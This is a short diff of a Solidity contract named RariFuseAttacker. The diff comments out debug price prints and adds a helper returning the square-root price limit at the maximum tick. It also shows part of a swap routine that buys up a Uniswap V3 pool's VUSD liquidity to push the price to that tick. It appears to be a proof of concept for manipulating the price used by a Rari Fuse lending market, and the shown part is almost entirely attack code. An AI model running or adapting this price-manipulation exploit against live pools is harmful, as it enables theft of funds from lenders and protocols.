@@ -71,10 +71,10 @@ contract RariFuseAttacker {
 
         // 4. Perform the swap such that we burn through the range orders up to our position at max tick
         //console.log("=== Current price before swap ===");
-        printCurrentPrice();
+        //printCurrentPrice();
         buyAllVUSD();
         //console.log("=== Current price after swap ====");
-        printCurrentPrice();
+        //printCurrentPrice();
 
         // refund left-over ETH
         refundWETH();
@@ -98,10 +98,15 @@ contract RariFuseAttacker {
         uint256 amountIn = swapRouter.exactOutputSingle(params);
     }
 
+    function getSqrtPriceLimit() public view returns(uint160 priceLimit){
+        priceLimit = UniswapMath.getSqrtRatioAtTick(UniswapMath.MAX_TICK - 1);
+    }
+
     function buyAllVUSD() internal {
         // we won't actually be able to buy up the entire VUSD.balanceOf(pool) balance, it'll be slightly less. I assume this is due to fees still in the contract or something
         // instead we use the sqrtPriceLimit at a max tick to search and buy up all liquidity up to this tick, s.t., in the end the new price will be at max tick
         // the sqrtPriceLimitX96 used here will end up being the sqrtPrice & currentTick of slot0, so pump it up to the maximum
+
         pool.swap(
             address(this), // receiver
             false, // zeroToOne (swap token0 to token1?)
